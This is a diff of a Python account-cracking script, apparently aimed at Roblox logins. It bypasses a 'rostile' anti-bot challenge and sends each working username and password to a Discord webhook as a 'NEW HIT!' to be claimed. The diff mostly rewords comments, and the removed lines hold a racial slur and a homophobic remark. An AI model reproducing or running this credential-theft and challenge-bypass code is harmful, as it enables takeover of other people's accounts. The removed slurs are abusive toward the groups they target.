@@ -1,6 +1,3 @@
-# lmk if u get curl cffi to work on mobile!
-# this code sucks lmafo
-# @money.txt (dc) if u got a solver.
 from curl_cffi import requests
 import base64
 import json
@@ -44,7 +41,7 @@ class V3:
                         return
 
                     webhook = DiscordWebhook(url=self.webhook_url)
-                    embed = DiscordEmbed(title='**NEW HIT!**', description='⚠️ React to this embed once the account is claimed.', color='03b2f8')
+                    embed = DiscordEmbed(title='**NEW HIT!**', description='Claim Before It Gets claimed', color='03b2f8')
                     embed.add_embed_field(name='Username', value=username, inline=True)
                     embed.add_embed_field(name='Password', value=password, inline=True)
                     embed.set_timestamp()
@@ -112,7 +109,6 @@ class V3:
         csrf_meta = soup.find('meta', attrs={'name': 'csrf-token'})
         return csrf_meta['data-token'] if csrf_meta else None
 
-    # insane solver super advanced!!! 😳 
     def solve_rostile_challenge(self, session, headers_login, challenge_metadata_b64, login_payload):
         challenge_metadata_decoded = base64.b64decode(challenge_metadata_b64).decode('utf-8')
         challenge_metadata_json = json.loads(challenge_metadata_decoded)
@@ -175,7 +171,7 @@ class V3:
                 return self.solve_rostile_challenge(session, headers_login, challenge_metadata_b64, login_payload)
 
             elif challenge_type == 'captcha':
-                # non rostile (gay)
+                
                 pass
 
         return response_login
@@ -255,6 +251,6 @@ class V3:
                     pass
 
 if __name__ == "__main__":
-    webhook_url = "ur fucking webhook nigga"
+    webhook_url = "Webhook Goes Here"
     Sentient = V3(webhook_url)
     Sentient.main()
